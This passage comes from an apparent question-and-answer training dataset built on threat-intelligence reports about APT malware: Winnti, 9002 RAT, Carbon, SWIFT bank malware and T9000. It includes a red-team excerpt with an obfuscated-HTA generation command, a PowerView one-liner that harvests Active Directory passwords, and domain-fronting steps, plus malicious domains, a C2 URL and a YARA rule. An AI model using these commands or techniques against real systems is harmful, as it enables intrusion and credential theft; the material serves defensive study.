hntech.com\nbot.jgame.in\nl.xxoo.co\nftp.hja63.com\nmail.msftncsl.com\ndns01.dyndns-work.com\nservice.hp-supports.com\nns2.nhnclass.com\nfax.cjinternet.us\nnx2.intercpu.com\nwindows.doomdns.com\nbtg.mynetav.net\nxxoo.co\nmynetav.net\nmini.msftncsl.com\npass2.hangame.co.uk\nwebadmin.dnsdojo.net\nimap.gcgame.info\njoymax.in\nudp.jjevil.com\nwww.reegame.net\nmyxxoo.com\niss.conimes.com\nads01.dyndns-web.com\nwww.mynetav.net\ndns.msftncsl.com\npop.jcrsoft.com\nball.reegame.net\nlyto.zzsoft.info\nrw.nhntech.com\nels.jcrsoft.com\na1.googletrait.com\ngoogletrait.com\nw80.xxoo.co\nscvhosts.com\nnexon.nexongame.net pic.4pu.com q.gcgame.info dbo.jcrsoft.com ns2.msftncsl.com\nynk.xxoo.co\ntw.hja63.com\npass1.reegame.net\nmy.zzsoft.info\nwww2.mynetav.net\nwww.nexongame.net\nid.naverpulic.com\nroap.myxxoo.com\nopenhost.webhop.net\nmir2.nexongame.net\nimap.jcrsoft.com\npop.gasoft.us\nbar.zzsoft.info\ngame.nexongame.net\nfs.nhntech.com\nosk.zzsoft.info\ndocs.nhnclass.com\nt3.nhntech.com\nahn.gasoft.us\nofficess.dyndns-office.com\nnew.nexoncorp.us\ndbo.zzsoft.info\nw.zzsoft.info\nlp.gcgame.info\nro.hja63.com\ngcgame.info\nxl.apanku.com\nweb-games.us\nsl.xxoo.co\nlogin.hangame.co.uk\nro.xxoo.co\ndbo.gasoft.us\nmoon.reegame.net\negi.mynetav.net\nvn.jcrsoft.com\nftp.mynetav.net\nus.nhntech.com\nmasternow.webhop.net\nfile.googlefiles.net\nholleword.3322.org\nest.zzsoft.info\napanku.com\nhelp.ibm-support.net\ntw.reegame.net\nest.gasoft.us\nmg.jcrsoft.com\nlp.apanku.com\nsmtp.hja63.com\nxnews.myPicture.info\nlp.zzsoft.info\nnx3.interdriver.net\nrss.6600.org\nfn.hja63.com\nusp.xxoo.co\nads01.dyndns-pics.com\noky.mynetav.net\npop.nexoncorp.us\nnaverpulic.com\npop.gcgame.info\nap.googleclick.net\nhaj.mynetav.net\nac.xxoo.co\nmini.nexongame.net\nudp.googleclick.net\nnd.xxoo.co\nnew.myxxoo.com\nrh.jcrsoft.com\nwm.xxoo.co\ndns.java-ssl.com\nwyqc.xxoo.co\nq.zzsoft.info\npass1.joymax.in\nitem.ItemDB.com\nreegame.net\nmailes.dyndns-mail.com\nnd.gasoft.us\na.zzsoft.info\nw53.xxoo.co\n\nQuestion: What is the significance of the MD5 hashes listed under 'Winnti MD5s: Winnti 1.0' in the context of the Winnti APT? How can these hashes be utilized by cybersecurity experts to enhance their defenses against similar attacks?\n\nAnswer:",
    "output": "The MD5 hashes listed under 'Winnti MD5s: Winnti 1.0' represent unique identifiers for specific malware samples associated with the Winnti group. These hashes can be utilized by cybersecurity experts to enhance their defenses by creating signatures for intrusion detection systems (IDS) and antivirus software. By monitoring for these hashes, organizations can detect and respond to potential Winnti-related threats more effectively. Additionally, these hashes can be used for threat intelligence sharing across different security platforms, enabling a more collaborative approach to combating the Winnti APT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: RED TEAMING for Security Effectiveness\nMandiant recently conducted a Red Team Assessment for an organization hosting large amounts of personally identifiable information (PII). The goal of the assessment was to validate the organization's ability to protect their PII. The red team was provided with the organization's name and no additional architectural information, making it a black-box assessment.\nThe red team used open source intelligence (OSINT) to identify the external IP addresses, email addresses and phone numbers that constituted the attack surface of the organization. After creating a list of target email addresses, the red team launched a phishing campaign using emails with a hyperlink crafted to direct the user to an HTML Application (HTA) payload. The payload launched the Windows-native Certutil command, calling back to a command and control (CnC) server. Three systems were compromised in the initial phishing campaign of 30 users.\nOne hour after the phishing campaign started, one of the targeted users reported the phishing email to the organization's abuse mailbox. The security operations center (SOC) responded to the report and blacklisted the fully qualified domain name (FQDN) of the web server hosting the HTA payload, but infected workstations continued to connect to the red team's CnC server. The FQDN of the CnC server was not identified and blocked by\nthe SOC because the HTA payload was designed to bypass manual and automated analysis by using a combination of obfuscation and sandbox evasion techniques.\nHTA payloads allow the red team to create convincing scenarios while delivering a flexible payload through the power of Microsoft's VBScript and JScript languages. HTAs also allow red teams to bypass application whitelisting controls because the native Windows application associated with the \"HTA\" file extension, mshta.exe, is a Microsoft-signed executable, a file type typically permitted to execute by application whitelists.\nAn unobfuscated HTA payload might run a command line command by invoking the \"Run\" method of VBScript's WScript.Shell class (Fig. 12).\nFigure 12. An HTA file that executes a PowerShell payload.\nThe unobfuscated HTA payload contains many plaintext strings that automated analysis could leverage to identify the HTA file as suspicious. For example, incident responders often monitor for the use of the PowerShell command, the syntax used to run a PowerShell command, and the presence of what appears to be a base64 encoded command. Creating an obfuscated payload is the simplest way to avoid these common detections. Publicly available tools, such as NCC Group's Demiguise2 can automatically create obfuscated HTA payloads that can only be decoded by the key provided during the obfuscation process.\nFigure 13 demonstrates the Demiguise obfuscation process used to generate an HTML document that relies on a specific string (in this case, 1.2.3.4) as the key to decrypt the HTA payload. In this case, the key is the external IP address of the victim organization. This can be obtained from OSINT or a previous compromise. The victim must have the same external IP address to decrypt the payload, effectively bypassing sandboxes hosted in a cloud environment.\nFigure 13. Using Demiguise to execute a PowerShell payload.\nroot@testbox:\u0334/git/demiguise#./demiguise.py -k 1.2.3.4 -c \"powershell.e xe -e VwByAGkAdABlACBASABvAHMAdAAgACIAUABXAE4ARQBEACIA0wAgAHIAZQBhAGQAL QBoAG8AcwB0AA==* -o payload.hta -p Outlook.Application\n[*] Generating with key 1.2.3.4\n[*] Will execute: powershell.exe -e VwByAGkAdABlACBASABvAHMAdAAgACIAUAB XAE4ARQBEACIA0wAgAHIAZQBhAGQALQBoAG8AcwB0AA==\n[+] HTA file written to: payload.html root@testbox:\u0334/git/demiguise#\n2  Available at https://github.com/nccgroup/demiguise.\nThe resulting payload (Fig. 14) has very few strings that can be detected by automated analysis, and the payload might avoid manual detection if it used a complex key retrieval process.\nFigure 14. An obfuscated payload for the basic PowerShell command.\nTo avoid sandbox detection mechanisms often deployed in mature environments, sandbox evasion techniques can be built into the payload with the obfuscation. A red team could use any number of sandbox evasion techniques including forcing the malware to wait or \"sleep\" a specified period of time before executing (Fig. 15), checking for mouse movement or clicks, or checking that a minimum number of processes are present for the payload to be executed. Combined with Demiguise, the final payload file has little to detect (Fig. 16).\nFigure 15. A delayed payload execution command.\nThe SOC was unable to identify the CnC server using network traffic analysis due to the use of a covert CnC communication known as domain fronting. This attack technique has been leveraged by Russian nation-state actors such as APT29. Originally developed as a technique to avoid censorship-based blocking of Internet traffic, domain fronting allows an attacker to abuse HTTPS connections to hide CnC activity in network traffic so that it is indistinguishable from legitimate requests for popular websites. The true destination of the CnC activity is obscured through the content delivery networks (CDNs). This technique leverages the HTTP \"Host\" header used in many shared hosting environments to specify the target for a specified request. This allowed Mandiant's red team to hide its CnC traffic in what appeared to be legitimate requests for sites hosted in the CDN. The red team used a configuration (Fig. 17) derived by following these steps:\n1. Create a CDN instance in the same shared hosting environment and configure this instance to forward traffic to the red team's malicious CnC server.\n2. During CnC communications, establish an SSL/TLS connection to a well-known site that uses the same CDN. There are publicly available lists of domains that can be used as an impersonated domain for most major CDNs.\n3. Set the \"Host\" header on subsequent HTTPS CnC requests to point to the CDN instance. This will cause the CDN to direct all requests to the actual domain rather than the impersonated domain used for the initial SSL/TLS connection.\nDomain fronting gives an attacker several advantages:\n\u2022 Renders detection of CnC traffic using known IP addresses or domain names ineffective.\n\u2022 Makes anomaly detection ineffective because the traffic is indistinguishable from other traffic destined for large CDNs.\n\u2022 Makes detection based on known bad or anomalous SSL/TLS certificates ineffective because the domain name and SSL/TLS certificate belong to a legitimate site in the CDN.\n\u2022 Creates challenges to remediation since blocking CnC traffic could result in legitimate domain names or IP addresses being blocked.\n\u2022 Prevents SSL/TLS decryption techniques from being used by taking advantage of certificate pinning for SSL/ TLS certificates.\nFigure 17. Preferred CnC setup.\nThe red team persisted on the initial three compromised systems using a Windows Management Instrumentation (WMI) event subscriber. The event subscription consisted of an event filter that acted as a trigger and an event consumer that executed the payload, in this case Symantec's signed \"symerr.exe\". The \"symerr.exe\" executable loads a DLL named \"cclib.dll\" from its current working directory, so Mandiant leveraged this functionality to load a malicious DLL (Fig. 18 and 19).\nFigure 18. Persistence using symerr.exe.\nC:\\Program Files\\Norton Internet Security\\Engine\\22.9.0.68\\symerr.exe cclib.dll\nFigure 19. Properties of symerr.exe.\nOnce a persistence mechanism was deployed to a few systems, the red team moved quickly to escalate privileges and move laterally before the initial systems and communications to the compromised network were lost. The red team looked for opportunities to escalate privileges in the domain using various techniques. One avenue that proved useful in this assessment was a misconfigured \"userPassword\" attribute in Active Directory.\nDepending on the Active Directory configuration, this attribute can be treated as either of the following:\n\u2022 An ordinary Unicode attribute, which can be written and read as any other Unicode attribute in directory.\n\u2022 A shortcut to userPassword in directory, which will allow password change operation to be performed over LDAP.\nPowerView3 has a \"Get-NetUser\" function that assists with automating the process of looking up this attribute in Active Directory. The red team used the command (Fig. 20) to harvest credentials for several service accounts on the Active Directory domain. Plaintext passwords are stored in the \"userPassword\" attribute in Unicode format (Fig. 21).\nFigure 20. PowerView function to grab userPassword field and decode it.\nget-netuser -Domain <REDACTEDDOMAIN> -Filter userpassword=* | select -expandproperty userpassword | %{[char][int]$_} | write-host -nonewline}; write-host\nFigure 21. Example userPassword attribute with stored Unicode password.\n3  Available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1.\nWith domain credentials, the red team was able to move laterally to additional systems in the environment. At this stage, the red team encountered a significant number of servers using Device Guard with constrained language mode enabled and application whitelisting. There are several ways to bypass Device Guard and application whitelisting, one of which is the built-in Microsoft signed executable \"MSBuild.exe\". Using signed executables allowed Mandiant to bypass application whitelisting by executing payloads in the context of a Microsoft signed process. Using the open source script PowerLessShell,4 Mandiant's red team executed PowerShell scripts and payloads without launching \"PowerShell.exe\" directly. With this tool, Mandiant generated a \"csproj\" file containing the payload and copied it to a new system. Mandiant could then use WMI commands to remotely execute MSBuild, which, in turn, executed the malicious \"csproj\" payload.\n\nQ: What obfuscation techniques did the red team employ to avoid detection of their HTA payloads? How did these techniques help in bypassing automated and manual analysis?",
    "output": "A: The red team employed obfuscation techniques using tools like NCC Group's Demiguise to create obfuscated HTA payloads. These payloads were designed to avoid common detections by encoding the payload in a way that requires a specific key to decrypt, such as the external IP address of the victim organization. This approach helps in bypassing automated and manual analysis because the payload contains very few plaintext strings that could be flagged as suspicious, and it effectively bypasses sandboxes hosted in a cloud environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4.3.3 Summary of Technical Sophistication Multiplier Value\nFigure 4 shows the technical sophistication multiplier values for e-mails submitted by the different organizations in our study. One key observation we make here is that the email-based targeted malware that was self-\nreported by our study groups is relatively simple. The highest multiplier value we see is 1.5 and even that value is seen infrequently. The majority of malware observed is rated either 1 or 1.25 according to our technical scoring criteria, with Tibetan Groups observing a higher fraction of malware rated 1.25 and Chinese groups observing a higher fraction rated 1.\nThe technical sophistication multiplier value is also useful for assessing the technical evolution of threats in our study. When we group malware into different family groups we can see some of these groups are under active development. For example, we observe multiple versions of the Enfal [40, 49], Mongal [14], and Gh0st RAT [15] families with increasing levels of sophistication and defenses in place to protect the malware code (resulting in an increase in technical multiplier from 1 to 1.25 for these families). Since our technical multiplier value focuses on how well malware code defends and disguises itself, changes to other aspects of the code may not result in an increase in value (e.g., we observe multiple versions of the IMuler.A/Revir.A malware which all receive a score of 1). Interestingly, when we observe both a Windows and Mac version of a given malware family, the technical score for the Mac version tended to be lower with the Mac version being relatively primitive relative to the Windows variant.\nMedium Headline: 4.4 TTI Results\nWe now show how the TTI metric can help us better characterize the relative threat posed by targeted malware. Figure 5 shows the technical sophistication multiplier and maximum/minimum TTI scores for malware families observed in our dataset. Since we primarily observe simple malware, with a technical sophistication multiplier of 1 or 1.25, this value does a poor job of differentiating the threat posed by the different malware families to the CSOs. However, by incorporating both the technical sophistication and targeting base value into the TTI metric we can gain more insights into how effective these\nthreats may be in practice.\nThe impact of using TTI is especially apparent when trying to gain insights into the targeted malware that poses the biggest risk to CSOs. Table 4 shows the top 5 malware families we observe in terms of technical sophistication and in terms of TTI score. If we consider the malware families with the highest technical sophistication, we can see that their TTI values are relatively low, with maximums ranging from 1.5 to 4.5. These tend to be malware families that are familiar to researchers. In particular, PlugX and PoisonIvy have been used in targeted attacks together [43] and PlugX is still actively used and under constant development [16]. Despite technical sophistication, the social engineering lures of these threats are not well crafted and pose less of a risk to the CSOs whose members may be able to identify and avoid these threats.\nIn contrast, the top 5 malware families in terms of TTI have lower technical sophistication (1.25) but much higher levels of social engineering. It is no surprise that threats which score the highest TTI use well known malware that have been extensively documented in attacks against a variety of targets. For example, the TTI scores reflect that Gh0st RAT continues to be seen in higher risk attacks due to its popularity amongst attackers even though it is an older and not particularly advanced tool. Since there is no direct connection between the technical sophistication of threats and the level of social engineering used to target CSOs, it is likely that different threat actors, with a different focus, are at work here. Indeed, Gh0st RAT was discovered by the Citizen Lab in their analysis of GhostNet [25] and IEXPL0RE RAT was discovered and named for the first time in our work.\nAnother observation is that commercial malware such as FinFisher and DaVinci RCS, while being of much higher technical sophistication (relative to the samples in\nTable 4: Top malware families in our data set in terms of technical sophistication multiplier and in terms of final TTI score.\nour study), do not necessarily score higher on TTI than a targeted attack with advanced social engineering and more basic malware. For example, analyzing a FinFisher sample targeted against Bahraini activists [38] with the TTI, produces an overall TTI score that is dependent on the social targeting aspect, even though the malware is very technically advanced. In this case, the FinFisher attack scores 4.0 on the TTI (base targeting score of 2 with a technical multiplier of 2). Although the email used in the attack references the name and organization of a real journalist, the content is poorly customized, and has attributes that look questionable. However, the technical sophistication of the malware is advanced earning it a score of 2 due to multiple advanced protection techniques, including a custom-written virtualized packer, MBR modification, and rootkit functionality. The sample also uses multiple minor forms of protection, including at least half a dozen anti-debugging tricks. Even though the technical multiplier is the maximum value, the overall TTI score is only 4.0 due to the low targeting base value. FinFisher is only effective if it is surreptitiously installed on a users' computer. If the malware is delivered through an email attachment, infection is only successful if the user opens the malicious file. The advanced nature of this malware will cause the overall score to increase quickly with improved targeting, but as it still requires user intervention, this threat scores lower overall than attacks with highly targeted social engineering using less sophisticated malware.\nSimilar findings can also be observed in attacks using DaVinci RCS developed by Italy-based company Hacking Team against activists and independent media groups from the United Arab Emirates and Morocco [36]. While the malware used in these publicly reported attacks is\ntechnically sophisticated, the social engineering lures employed are poorly customized for the targets resulting in a 4.0 TTI score (targeting base value 2, technical multiplier 2).\nThese results support the idea that different threat actors have varying focuses and levels of resources, and as a result, different methodologies for attacks. For example, the majority of malware submitted by our study groups appear to be from adversaries that have in-house malware development capabilities and the capacity to organize and implement targeted malware campaigns. These adversaries are spending significant effort on social engineering, but generally do not use technically advanced malware. Conversely, the adversaries using FinFisher and DaVinci RCS have bought these products rather than develop malware themselves. However, while the FinFisher and RCS samples are technically sophisticated pieces of malware, the attacks we analyzed are not sophisticated in terms of social engineering tactics.\nMedium Headline: 4.5 Limitations of TTI\nWhile the Targeted Threat Index gives insight into the distribution of how sophisticated threats are, we are still in the process of evaluating and refining it through interactions with the groups in our study and inclusion of more sophisticated threats observed in related investigations in our lab. Average TTI scores in our dataset may be skewed due to the self-reporting method we use in the study. Very good threats are less likely to be noticed and reported while being sent to far fewer people, and low-quality emails are much more likely to be sent in bulk and stand out. It is also possible that individuals in different groups may be more diligent in submitting samples, which could affect between group comparisons. We are more interested, however, in worst-case (highest) scores and not in comparing the average threat severity between organizations.\nFinally, this metric is calculated based on the technical sophistication of the payload, not on the specific exploit. There is currently no method to modify the TTI score in a way similar to the temporal metrics used by the CVSS metric. A temporal metric could be added to increase the final TTI value for 0-day vulnerabilities, or possibly to reduce the score for exploits that are easily detectable due to a public and well-known generation script, e.g. Metasploit [2].\n\nHow does the technical sophistication multiplier value help in assessing the technical evolution of threats in the study? Explain with examples.",
    "output": "A: The technical sophistication multiplier value helps in assessing the technical evolution of threats by tracking changes in the sophistication and defenses of malware code over time. For instance, the study observed multiple versions of the Enfal, Mongal, and Gh0st RAT families with increasing levels of sophistication and defenses, leading to an increase in the technical multiplier from 1 to 1.25 for these families. However, changes to other aspects of the code that do not enhance defenses or disguise the malware may not result in an increase in value. Additionally, it was noted that Mac versions of malware families tended to be less sophisticated than their Windows counterparts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Enter Trojan.APT.9002\nThrough the FireEye Dynamic Threat Intelligence (DTI) cloud, we were able to retrieve the payload dropped in the attack. This payload has been identified as a variant of Trojan.APT.9002 (aka Hydraq/McRAT variant) and runs in memory only. It does not write itself to disk, leaving little to no artifacts that can be used to identify infected endpoints.\nSpecifically, the payload is shellcode, which is decoded and directly injected into memory after successful exploitation via a series of steps. After an initial XOR decoding of the payload with the key \"0x9F\", an instance of rundll32.exe is launched and injected with the payload using CreateProcessA, OpenProcess, VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.\nAfter transfer of control to the injected payload in rundll32.exe, the shellcode is then subjected to two more levels of XOR decoding with the keys '0\u00d701\u2032, followed by '0x6A'.\nProcess execution is then transferred to the final decoded payload, which is a variant of the 9002 RAT.\nThe fact that the attackers used a non-persistent first stage payload suggests that they are confident in both their resources and skills. As the payload was not persistent, the attackers had to work quickly, in order to gain control of victims and move laterally within affected organizations. If the attacker did not immediately seize control of infected endpoints, they risked losing these compromised endpoints, as the endpoints could have been rebooted at any time \u2013 thus automatically wiping the in-memory Trojan.APT.9002 malware variant from the infected endpoint.\nAlternatively, the use of this non-persistent first stage may suggest that the attackers were confident that their intended targets would simply revisit the compromised website and be re-infected.\nBig Headline: Command and Control Protocol and Infrastructure\nThis Trojan.APT.9002 variant connected to a command and control server at 111.68.9.93 over port 443. It uses a non-HTTP protocol as well as an HTTP POST for communicating with the remote server. However, the callback beacons have changed in this version, in comparison to the older 9002 RATs.\nThe older traditional version of 9002 RAT had a static 4-byte identifier at offset 0 in the callback network traffic. This identifier was typically the string \"9002\u2033, but we have also seen variants, where this has been modified \u2013 such as the 9002 variant documented in the (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/08/the-sunshop-campaign-continues.html>)Sunshop campaign.\nIn contrast, the beacon from the diskless 9002 payload used in the current IE 0-day attack is remarkably different and uses a dynamic 4-byte XOR key to encrypt the data. This 4-byte key is present at offset 0 and changes with each subsequent beacon. FireEye labs is aware that the 4-byte XOR version of 9002 has been in the wild for a while and is used by multiple APT actors, but this is the first time we've seen it deployed in the diskless payload method.\nThe XOR decoded data always contains the static value \"\\x09\\x12\\x11\\x20\u2033 at offset 16. This value is in fact hardcoded in packet data construction function prior to XOR encoding. This value most likely is the date \"2011-12-09\u2033 but its significance is not known at this time.\nThe diskless 9002 RAT payload also makes a POST request, which has also changed from the traditional version. It has Base64 stub data, instead of the static string \"AA\". The User-Agent string and URI pattern remain the same however. It uses the static string \"lynx\" in the User-Agent string and the URI is incremental hexadecimal values.\nAA\nwUeAKsFHgCrBR4AqwUeAKshVkQrBR4Aqw UeAKsFHgCrBR4AqwUeAKsFHgCrBR4Aqw UeAKsFHgCrBR4AqwUeAKsFHgCrBR4AqwUe AKg==\nThe data in the POST stub is also encrypted with a 4-byte XOR key, and when decrypted, the data is similar to the data in the non-HTTP beacon and also has the static value \"\\x09\\x12\\x11\\x20\u2033.\nBig Headline: Campaign Analysis\nWe previously observed 104130d666ab3f640255140007f0b12d connecting to the same 111.68.9.93 IP address.\nAnalysis of MD5 104130d666ab3f640255140007f0b12d revealed that it shared unique identifying characteristics with 90a37e54c53ffb78969644b1a7038e8c, acbc249061a6a2fb09271a68d53567d9, and 20854f54b0d03118681410245be39bd8.\nMD5 acbc249061a6a2fb09271a68d53567d9 and 90a37e54c53ffb78969644b1a7038e8c are both Trojan.APT.9002 variants and connect to a command and control server at 58.64.143.244.\nMD5 20854f54b0d03118681410245be39bd8 is another Trojan.APT.9002 variant. This variant connected to a command and control server at ad04.bounceme.net.\nPassive DNS analysis of this domain revealed that it resolved to 58.64.213.104 between 2011-09-23 and 2011-10-21. The following other domains have also been seen resolving to this same IP address:\nIf the domain dll.freshdns.org rings a bell, it should. While covering a different Internet Explorer Zero-day (CVE-2013-3893) and the associated Operation DeputyDog campaign, we reported that the CnC infrastructure used in that campaign overlapped with this same domain: dll.freshdns.org.\nInside the in-memory version of the Trojan.APT.9002 payload used in this strategic Web compromise, we identified the following interesting string: \"rat_UnInstall\". Through DTI, we found this same string present in a number of different samples including the ones discussed above:\n104130d666ab3f640255140007f0b12d 90a37e54c53ffb78969644b1a7038e8c acbc249061a6a2fb09271a68d53567d9\n20854f54b0d03118681410245be39bd8\nBased on this analysis, all of these samples, including the in-memory variant, can be detected with the following simple YARA signature:\nrule FE_APT_9002_rat\n{\nmeta:\nauthor = \"FireEye Labs\"\nstrings:\n$a = \"rat_UnInstall\" wide ascii\ncondition:\n($mz at 0) and $a\n}\nWe also found the following strings of interest present in these above 9002 RAT samples (excluding the in-memory variant):\nMcpRoXy.exe\nSoundMax.dll\nThese strings were all observed and highlighted by Bit9 (<https://blog.bit9.com/2013/02/25/bit9-security-incident-update/>)here. As Bit9 notes in their blog,\nTrojan.APT.9002 (aka Hydraq/McRAT) was also used in the original Operation Aurora campaign, and the \"rat_UnInstall\" string can be found in the original Aurora samples confirming the lineage.\nBig Headline: Conclusions\nBy utilizing strategic Web compromises along with in-memory payload delivery tactics and multiple nested methods of obfuscation, this campaign has proven to be exceptionally accomplished and elusive. APT actors are clearly learning and employing new tactics. With uncanny timing and a penchant for consistently employing Zero-day exploits in targeted attacks, we expect APT threat actors to continue to evolve and launch new campaigns for the foreseeable future. Not surprisingly, these old dogs continue to learn new tricks.\nFireEye Labs would like to thank iSIGHT Partners for their assistance with this research.\nThis entry was posted in (<http://www.fireeye.com/blog/category/technical/cyber-exploits>)Exploits, (<http://www.fireeye.com/blog/category/technical/targeted-attack>)Targeted Attack, (<http://www.fireeye.com/blog/category/technical/threat-intelligence>)Threat Intelligence, (<http://www.fireeye.com/blog/category/technical>)Threat Research, (<http://www.fireeye.com/blog/category/technical/vulnerabilities>)Vulnerabilities\nby (<http://www.fireeye.com/blog/author/ned-moran>)Ned Moran, (<http://www.fireeye.com/blog/author/sai-vashisht>)Sai Omkar Vashisht, (<http://www.fireeye.com/blog/author/mscott>)Mike Scott and (<http://www.fireeye.com/blog/author/thoufique-haq>)Thoufique Haq. Bookmark the (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/operation-ephemeral-hydra-ie-zero-day-linked-to-deputydog-uses-diskless-method.html>)permalink.\nRead the text above and answer this question: How does the communication protocol of the Trojan.APT.9002 variant used in Operation Ephemeral Hydra differ from older versions, and what implications does this have for detecting and analyzing the malware?",
    "output": "The Trojan.APT.9002 variant used in Operation Ephemeral Hydra employs a different communication protocol compared to older versions. Unlike the traditional static 4-byte identifier '9002' at offset 0 in the callback network traffic, this variant uses a dynamic 4-byte XOR key to encrypt the data, which changes with each subsequent beacon. Additionally, the POST request now includes Base64 stub data instead of the static string 'AA', although the User-Agent string and URI pattern remain the same. These changes complicate detection and analysis efforts, as defenders must adapt their techniques to account for the dynamic nature of the encryption keys and the altered structure of the network traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Explain how the Carbon backdoor manages the backup and transmission of its configuration file to the C&C server. What encryption method is used and how is the process triggered?",
    "output": "The Carbon backdoor periodically backs up and sends its configuration file to the C&C server within a specific time range (default 8h to 20h). The configuration file is checked using the 'configlastsend' value from the [TIME] section. If it hasn't been sent in over a month, the file is copied to a temporary location with a random name prefixed by '~D' in the '208' or '1033' folder (depending on the version). This file is then encrypted using the CAST-128 algorithm. To notify the communication thread, a line is appended to 'C_56743.NLS' or 'dsntype.gif' with details about the file. Finally, the 'configlastsend' attribute is updated with the current time.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Attacks on SWIFT Banking System Benefit From Insider Knowledge\nMay 20,\n2016\nBy on May 20, 2016\nIn recent months, we've seen headlines about the compromise of a bank in Bangladesh from which cybercriminals attempted to steal US$951 million. The malware they used was able to manipulate and read unique messages from SWIFT (Society for Worldwide Interbank Financial Telecommunication), as well as adjust balances and send details to a remote control server. BAE Systems wrote a detailed analysis and concluded that the malware must be based on a framework of different modules that could be used for multiple targets.\nThis week SWIFT sent another warning without details about another bank, this time in Vietnam that was compromised. According to a bank spokesperson, they detected in a timely manner the fraudulent transfer of $1.13 million in December 2015. Because we know the attackers had some insight into the Bangladesh attack, McAfee assumed the attackers also knew something beforehand about the Vietnamese bank. We investigated possible malware indicators for the latter attack.\nFiles used for the investigation:\nMD5: 0b9bf941e2539eaa34756a9e2c0d5343\nMD5: 909e1b840909522fe6ba3d4dfd197d93\nWe focused our analysis primarily on the first sample. The file's compile timestamp is 2015-12-04 02:04:23. The first submission of the file from Vietnam was on December 22, 2015.\nIn the case of the Vietnamese bank, the file used for the attack is a fake version of the popular PDF reader Foxit. The malware installs itself in the original Foxit installation directory and renames the original file to FoxltReader.exe.\nOnce the user starts using the fake reader, the malware executes and writes to a log file in the temp directory C:\\\\Windows\\temp\\\\WRTU\\ldksetup.tmp. Analyzing this file, we see the log data is XOR encoded using the value 0x47.\nAs in the case of the Bangladeshi bank, the malware uses the configuration file Lmutilps32.dat, which can also be found in C:\\\\Windows\\\\temp\\WRTU\\. This file is also XOR encoded, with the value 0x7C4D5978.\nWas this malware part of a targeted attack? Yes, absolutely. As in the malware used against the Bangladeshi bank, we found the SWIFT code for the target in multiple places in the malware:\nThe code TPBVVNVX is the SWIFT code for the Tienphong Commercial Joint Stock Bank, in Hanoi.\nWe also noticed that there were more SWIFT codes in the code:\nThese banks are based in Australia, Singapore, Japan, Korea, Vietnam, Italy, and the United States. We wondered why the actors would put this particular list in the malware. Further analyzing the working of the malware, we discovered an interesting part in the code concerning \"Executing the real Foxit reader\" and the next section in the code states \"PDFmodulation success. \u2026\" This hints of the manipulation of PDF files.\nIn the code, we found that the malware uses the original driver fpdsdk.dll from the Foxit SDK to execute the transformation of the files.\nWe discovered functionality in the code that converts PDF files to XML files, which are stored in the folder C:\\Documents and Settings\\Test\\Local Settings\\Temp\\. The filenames start with XXX or RSP followed by a value between 0-F and finish with the extension .tmp.\nLet's return to our list of SWIFT codes of other banks. The malware reads the SWIFT messages and checks if the sender of the message is one of the listed banks. Once it finds these messages, it reads their information:\nThe malware can manipulate these messages: deleting transactions, transaction history, and system logs, and prevent the printing of the fraudulent transactions:\nAs in the Bangladeshi attack, we found some typos:\nBangladesh: \"fandation\" instead of \"foundation\" and \"alreay\" instead of \"already\"\nVietnam: \"FilleOut\" instead of \"FileOut\"\nDoes this analysis tell us anything about the actors? It might, but these details form a weak indicator. How easy is it to misspell some words on purpose to mislead investigators?\n\nQuestion: What insights can be drawn from the presence of multiple SWIFT codes in the malware used in the Vietnamese bank attack, and how did the malware utilize these codes to manipulate PDF files and SWIFT messages?\n\nAnswer:",
    "output": "The presence of multiple SWIFT codes in the malware used in the Vietnamese bank attack suggests that the malware was designed to target specific banks, including those based in Australia, Singapore, Japan, Korea, Vietnam, Italy, and the United States. The malware utilized these SWIFT codes to read and manipulate SWIFT messages. Specifically, it checked if the sender of a SWIFT message was one of the listed banks and then read their information. The malware also included functionality to convert PDF files to XML files, which were stored in a specific folder. This manipulation involved using the original driver fpdsdk.dll from the Foxit SDK to transform the files. The malware could delete transactions, transaction history, and system logs, and prevent the printing of fraudulent transactions, indicating a sophisticated level of manipulation aimed at covering its tracks and evading detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: IOC's\nC2 IP: 198.55.120[.]143:7386\nURL: http://198.55.120[.]143:7386/B/ResN32.dll\nMD5 (RTF):\t\n  fdb6543bfb77aa6ddff0f4dfe07e442f\nMD5 (T9000 main binary): d8d70851641efbdfce8d561e6b1a2f29\nMD5 (Elevate.dll): 1d335f6a58cb9fab503a9b9cb371f57b\nMD5 (QQMgr.dll): b9c584c7c34d14599de8cd3b72f2074b\nMD5 (QQMgr.inf): 8ac933be588f49560179c26ddbc6a753\nMD5 (ResN32.dat): 50753c28878ce10a748fbd7b831ecbe1\nMD5 (ResN32.dll): a45e5c32fc2bc7be9d6e4bba8b2807bf\nMD5 (hccutils.dll): 2299fb8268f47294eb2b18282540a955\nMD5 (hccutils.inf): 2f31ef1a8fca047ed0d623010d569857\nMD5 (hjwe.dat): d3601a5160b8d122261989d147221eb7\nMD5 (qhnj.dat): a9de62186cb8d0e23b0dc75e1ae373ac\nMD5 (tyeu.dat): 29ec20f5fa1817dc9250c434e61420ea\nMD5 (vnkd.dat): 35f4ce864c3a3dc016fea3459d6402a9\nSHA-\u00ad\u2010256 (RTF): 8e4de6fb35ce4cd47e06b48fb86b7da3eba02031cfd8ae714e25f8f7903f0141\nSHA-\u00ad\u2010256 (T9000 main binary): 7c04286734718300e2c0691be9b6622f2d2525ca07ab27102a424af6f8cc3aec\nSHA-\u00ad\u2010256 (Elevate.dll): 9c23febc49c7b17387767844356d38d5578727ee1150956164883cf555fe7f95\nSHA-\u00ad\u2010256 (QQMgr.dll): bf1b00b7430899d33795ef3405142e880ef8dcbda8aab0b19d80875a14ed852f\nSHA-\u00ad\u2010256 (QQMgr.inf): ace7e3535f2f1fe32e693920a9f411eea21682c87a8e6661d3b67330cd221a2a\nSHA-\u00ad\u2010256 (ResN32.dat): 